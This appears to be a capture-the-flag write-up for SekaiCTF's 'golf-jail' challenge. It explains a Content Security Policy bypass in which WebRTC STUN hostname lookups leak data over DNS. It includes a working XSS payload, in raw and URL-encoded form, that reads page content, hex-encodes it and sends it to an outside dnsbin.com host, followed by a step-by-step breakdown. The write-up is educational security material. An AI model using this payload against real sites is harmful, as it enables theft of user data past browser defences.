# CSP Bypass via WebRTC DNS Exfiltration

A demonstration of Content Security Policy bypass using WebRTC for DNS-based data exfiltration, as showcased in the SekaiCTF "golf-jail" challenge.

## Target CSP Configuration

```http
Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; script-src 'unsafe-inline' 'unsafe-eval';
```

### CSP Analysis:
- `script-src 'unsafe-inline'` - Allows inline JavaScript execution
- `default-src 'none'` - Blocks all resource loading by default
- `connect-src` (implicit 'none') - Blocks fetch(), XMLHttpRequest, WebSocket
- `img-src` (implicit 'none') - Blocks image loading
- `form-action` (implicit 'none') - Blocks form submissions

## WebRTC Bypass Technique

### Why WebRTC Works:
1. **CSP Gap**: No specific WebRTC controls in CSP v3
2. **DNS Resolution**: STUN server hostname resolution bypasses `connect-src`
3. **Implicit Behavior**: ICE candidate gathering happens automatically
4. **Covert Channel**: DNS queries serve as data exfiltration channel

## Exploit Payload

### Raw Payload:
```html
<svg onload="flag=document.childNodes[0].nodeValue.trim();pc=new RTCPeerConnection({iceServers:[{urls:['stun:'+flag.split('').map(c=>c.charCodeAt(0).toString(16)).join('').slice(0,32)+'.dnsbin.com']}]});pc.createOffer({offerToReceiveAudio:1}).then(o=>pc.setLocalDescription(o))">
```

### URL Encoded:
```
http://127.0.0.1:8080/?xss=%3Csvg%20onload%3D%22flag%3Ddocument.childNodes%5B0%5D.nodeValue.trim()%3Bpc%3Dnew%20RTCPeerConnection(%7BiceServers%3A%5B%7Burls%3A%5B%27stun%3A%27%2Bflag.split(%27%27).map(c%3D%3Ec.charCodeAt(0).toString(16)).join(%27%27).slice(0%2C32)%2B%27.dnsbin.com%27%5D%7D%5D%7D)%3Bpc.createOffer(%7BofferToReceiveAudio%3A1%7D).then(o%3D%3Epc.setLocalDescription(o))%22%3E
```

## Technical Breakdown

### Step 1: Flag Extraction
```javascript
flag = document.childNodes[0].nodeValue.trim();
```
- Extracts sensitive data from DOM
- No network request involved

### Step 2: Data Encoding
```javascript
flag.split('').map(c => c.charCodeAt(0).toString(16)).join('').slice(0,32)
```
- Converts flag to hexadecimal
- Limits to 32 characters (DNS subdomain length limit)
- Example: `SEKAI{test}` → `53454b41497b746573747d`

### Step 3: WebRTC Connection Setup
```javascript
pc = new RTCPeerConnection({
  iceServers: [{
    urls: ['stun:' + hexFlag + '.dnsbin.com']
  }]
});
```
- Creates peer connection with flag embedded in STUN server hostname
- CSP doesn't control WebRTC peer connection creation

### Step 4: DNS Exfiltration Trigger
```javascript
pc.createOffer({offerToReceiveAudio: 1}).then(o => pc.setLocalDescription(o));
```
- Initiates ICE candidate gathering
- Forces DNS lookup: `53454b41497b746573747d.dnsbin.com`
- DNS query contains the exfiltrated flag

